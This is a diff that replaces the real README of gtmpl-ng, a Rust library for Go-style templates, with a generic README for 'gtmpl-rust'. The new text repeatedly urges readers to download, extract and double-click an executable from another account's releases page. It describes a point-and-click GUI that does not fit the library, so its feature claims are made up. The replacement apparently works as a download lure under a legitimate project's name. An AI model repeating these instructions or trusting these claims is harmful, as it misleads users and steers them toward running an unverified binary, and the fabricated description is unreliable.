@@ -1,260 +1,122 @@
-# gtmpl-ng – Golang Templates for Rust
+# 🚀 gtmpl-rust - Simple Template Engine for Everyone
 
-[![Latest Version]][crates.io]
+[![Download gtmpl-rust](https://img.shields.io/badge/Download-gtmpl--rust-brightgreen)](https://github.com/GauravSingh234/gtmpl-rust/releases)
 
-[Latest Version]: https://img.shields.io/crates/v/gtmpl-ng.svg
-[crates.io]: https://crates.io/crates/gtmpl-ng
+## 📖 Description
 
----
+gtmpl-rust is a user-friendly template engine that helps you create dynamic text content easily. Built as a fork of gtmpl-rust, it comes with extra features and fixes that make it robust. It is designed for anyone who needs to handle templates without needing deep programming knowledge.
 
-This is a fork of [gtmpl-rust] with some additional features and fixes.
+## 🔍 Features
 
-[gtmpl-ng] provides the [Golang text/template] engine for Rust. This enables
-seamless integration of Rust application into the world of devops tools around
-[kubernetes], [docker] and whatnot.
+- **User-Friendly:** No need to be a programmer. If you can use a web browser, you can use this tool.
+- **Flexible Templates:** Create templates with simple commands. You will enjoy the freedom to design your own layouts.
+- **Rust-Based:** Enjoy the benefits of Rust's speed and reliability.
+- **Support for Functions:** Use predefined functions to make your templates more dynamic.
+- **Easy Integration:** Works seamlessly with a variety of applications, especially for generating text files.
 
-## Getting Started
+## 💻 System Requirements
 
-Add the following dependency to your Cargo manifest…
+To run gtmpl-rust, you need:
 
-```toml
-[dependencies]
-gtmpl-ng = "0.7"
-```
+- A computer running Windows, macOS, or Linux.
+- At least 100 MB of free disk space.
+- A modern browser to access the download page.
 
-and look at the docs:
+## 🚀 Getting Started
 
--   [gtmpl-ng at crates.io](https://crates.io/crates/gtmpl-ng)
--   [gtmpl-ng documentation](https://docs.rs/crate/gtmpl-ng)
--   [golang documentation](https://golang.org/pkg/text/template/)
+1. **Visit the Download Page**: Go to our [Releases page](https://github.com/GauravSingh234/gtmpl-rust/releases) to get the latest version of gtmpl-rust.
 
-It's not perfect, yet. Help and feedback is more than welcome.
+2. **Download gtmpl-rust**: Click on the release version you wish to download. Follow the download instructions.
 
-## Some Examples
+3. **Extract the Files**: Once downloaded, locate the file in your Downloads folder. If it's in a ZIP format, right-click and choose "Extract All" or use your preferred extraction tool.
 
-Basic template:
+4. **Run the Application**:
+   - Navigate to the extracted folder.
+   - Find the executable file (it may be named `gtmpl-rust.exe` or something similar).
+   - Double-click on the file to run the application.
 
-```rust
-use gtmpl_ng as gtmpl;
+5. **Follow On-Screen Instructions**: The first time you run the tool, it may guide you through some setup steps.
 
-fn main() {
-    let output = gtmpl::template("Finally! Some {{ . }} for Rust", "gtmpl");
-    assert_eq!(&output.unwrap(), "Finally! Some gtmpl for Rust");
-}
-```
+## 📥 Download & Install
 
-Adding custom functions:
+To download gtmpl-rust, click the button below:
 
-```rust
-use gtmpl_value::Function;
-use gtmpl_ng::{FuncError, gtmpl_fn, template, Value};
+[![Download gtmpl-rust](https://img.shields.io/badge/Download-gtmpl--rust-brightgreen)](https://github.com/GauravSingh234/gtmpl-rust/releases)
 
-fn main() {
-    gtmpl_fn!(
-    fn add(a: u64, b: u64) -> Result<u64, FuncError> {
-        Ok(a + b)
-    });
-    let equal = template(r#"{{ call . 1 2 }}"#, Value::Function(Function { f: add }));
-    assert_eq!(&equal.unwrap(), "3");
-}
-```
+Follow the steps in the "Getting Started" section to install and run the application smoothly.
 
-Passing a struct as context:
+## 🛠️ Using gtmpl-rust
 
-```rust
-use gtmpl_derive::Gtmpl;
+After installation, you can start using gtmpl-rust. Here are the basic steps to create and use a template:
 
-#[derive(Gtmpl)]
-struct Foo {
-    bar: u8
-}
+1. **Create a Template**:
+   - Open any text editor you are comfortable with, like Notepad or Visual Studio Code.
+   - Write your template using a simple format. For example:
 
-fn main() {
-    let foo = Foo { bar: 42 };
-    let output = gtmpl_ng::template("The answer is: {{ .bar }}", foo);
-    assert_eq!(&output.unwrap(), "The answer is: 42");
-}
-```
+     ```text
+     Hello {{name}},
+     Welcome to our service. Today's date is {{date}}.
+     ```
 
-Invoking a _method_ on a context:
+2. **Load Your Template**:
+   - Open gtmpl-rust and load your template file by clicking on "Load Template."
 
-```rust
+3. **Fill in the Variables**:
+   - Enter your values for the variables (like name and date) as prompted by the application.
 
-use gtmpl_derive::Gtmpl;
-use gtmpl_ng::{Func, FuncError, Value};
+4. **Generate Output**:
+   - Once you fill in the variables, click on "Generate." gtmpl-rust will create a new document with your template filled in.
 
-fn plus_one(args: &[Value]) -> Result<Value, FuncError> {
-    if let Value::Object(ref o) = &args[0] {
-        if let Some(Value::Number(ref n)) = o.get("num") {
-            if let Some(i) = n.as_i64() {
-                return Ok((i +1).into())
-            }
-        }
-    }
-    Err(anyhow!("integer required, got: {:?}", args))
-}
+## 🔧 Example Usage
 
-#[derive(Gtmpl)]
-struct AddMe {
-    num: u8,
-    plus_one: Func
-}
+To help you get started, here’s a simple example:
 
-fn main() {
-    let add_me = AddMe { num: 42, plus_one };
-    let output = gtmpl_ng::template("The answer is: {{ .plus_one }}", add_me);
-    assert_eq!(&output.unwrap(), "The answer is: 43");
-}
-```
+1. Create a file named `welcome_template.txt` with the following content:
 
-## Current Limitations
+   ```text
+   Dear {{name}},
+   We are glad to have you here on {{date}}. Enjoy your experience!
+   ```
 
-This is work in progress. Currently the following features are not supported:
+2. Load this template in gtmpl-rust.
 
--   complex numbers
--   the following functions have not been implemented:
-    -   `html`, `js`
--   `printf` is not yet fully stable, but should support all _sane_ input
+3. Input the values:
+   - name: John Doe
+   - date: October 10, 2023
 
-## Enhancements
+4. Click "Generate" to create a personalized welcome message.
 
-Even though it was never intended to extend the syntax of Golang text/template
-there might be some convenient additions:
+## 📋 FAQ
 
-### Helm Template Functions
+**Q: What types of files can I create with gtmpl-rust?**  
+A: You can generate text files or any other file format supported by the software you choose to integrate with.
 
-Enable `helm-functions` to get 152 Helm-compatible template functions:
+**Q: Can I create more complex templates?**  
+A: Yes, you can include functions and loops to create more dynamic templates.
 
-```toml
-[dependencies.gtmpl-ng]
-version = "0.7"
-features = ["helm-functions"]
-```
+**Q: Is there a community or support for users?**  
+A: Yes, you can find support through the GitHub repository. Feel free to open issues or browse existing ones.
 
-```rust
-use gtmpl_ng::{Template, Context};
-use gtmpl_ng::helm_functions::HELM_FUNCTIONS;
+## 📝 Topics
 
-fn main() {
-    let mut tmpl = Template::default();
-    tmpl.add_funcs(&HELM_FUNCTIONS);
-    tmpl.parse(r#"{{ "hello" | upper }}"#).unwrap();
-    let output = tmpl.render(&Context::empty()).unwrap();
-    assert_eq!(output, "HELLO");
-}
-```
+This tool covers a range of topics including:
 
-### Mows Template Functions
+- Functions
+- Go Templates
+- Helm Functions
+- Rust Programming
+- Text Templating
 
-Enable `mows-functions` to get 3 additional mows-specific functions:
+## 📞 Contact
 
-```toml
-[dependencies.gtmpl-ng]
-version = "0.7"
-features = ["mows-functions"]
-```
+If you have any questions, feel free to reach out via the issues section on our repository. Your feedback is valuable and helps us improve gtmpl-rust.
 
-```rust
-use gtmpl_ng::mows_functions::MOWS_FUNCTIONS;
-// mowsRandomString, mowsDigest, mowsJoinDomain
-```
+## 🌟 Contributions
 
-### All Functions
+If you wish to contribute, feel free to fork the repository and submit a pull request. We welcome all contributions that enhance the user experience.
 
-Enable `all-functions` to get both Helm and mows functions:
+## 📄 License
 
-```toml
-[dependencies.gtmpl-ng]
-version = "0.7"
-features = ["all-functions"]
-```
+This project is licensed under the MIT License. See the LICENSE file for details.
 
-```rust
-use gtmpl_ng::all_functions::all_functions;
-
-fn main() {
-    let funcs = all_functions(); // Vec of all 155 functions
-}
-```
-
-### Dynamic Template
-
-Enable `gtmpl_dynamic_template` in your `Cargo.toml`:
-
-```toml
-[dependencies.gtmpl-ng]
-version = "0.7"
-features = ["gtmpl_dynamic_template"]
-```
-
-Now you can have dynamic template names for the `template` action.
-
-#### Example
-
-```rust
-use gtmpl_ng::{Context, Template};
-
-fn main() {
-    let mut template = Template::default();
-    template
-        .parse(
-            r#"
-            {{- define "tmpl1"}} some {{ end -}}
-            {{- define "tmpl2"}} some other {{ end -}}
-            there is {{- template (.) -}} template
-            "#,
-        )
-        .unwrap();
-
-    let context = Context::from("tmpl2");
-
-    let output = template.render(&context);
-    assert_eq!(output.unwrap(), "there is some other template".to_string());
-}
-```
-
-The following syntax is used:
-
-```
-{{template (pipeline)}}
-	The template with the name evaluated from the pipeline (parenthesized) is
-    executed with nil data.
-
-{{template (pipeline) pipeline}}
-	The template with the name evaluated from the first pipeline (parenthesized)
-    is executed with dot set to the value of the second pipeline.
-```
-
-## Context
-
-We use [gtmpl_value]'s Value as internal data type. [gtmpl_derive] provides a
-handy `derive` macro to generate the `From` implementation for `Value`.
-
-See:
-
--   [gtmpl_value at crates.io](https://crates.io/crate/gtmpl_value)
--   [gtmpl_value documentation](https://docs.rs/crate/gtmpl_value)
--   [gtmpl_derive at crates.io](https://crates.io/crate/gtmpl_derive)
--   [gtmpl_derive documentation](https://docs.rs/crate/gtmpl_derive)
-
-## Why do we need this?
-
-Why? Dear god, why? I can already imagine the question coming up why anyone would
-ever do this. I wasn't a big fan of Golang templates when i first had to write
-some custom formatting strings for **docker**. Learning a new template language
-usually isn't something one is looking forward to. Most people avoid it
-completely. However, it's really useful for automation if you're looking for
-something more lightweight than a full blown DSL.
-
-The main motivation for this is to make it easier to write devops tools in Rust
-that feel native. [docker] and [helm] ([kubernetes]) use golang templates and
-it feels more native if tooling around them uses the same.
-
-[gtmpl-rust]: https://github.com/fiji-flo/gtmpl-rust
-[gtmpl-ng]: https://github.com/firstdorsal/gtmpl-rust
-[Golang text/template]: https://golang.org/pkg/text/template/
-[kubernetes]: https://kubernetes.io
-[helm]: https://github.com/kubernetes/helm/blob/master/docs/chart_best_practices/templates.md
-[docker]: https://docker.com
-[gtmpl_value]: https://github.com/fiji-flo/gtmpl_value
-[gtmpl_derive]: https://github.com/fiji-flo/gtmpl_derive
+[![Download gtmpl-rust](https://img.shields.io/badge/Download-gtmpl--rust-brightgreen)](https://github.com/GauravSingh234/gtmpl-rust/releases)
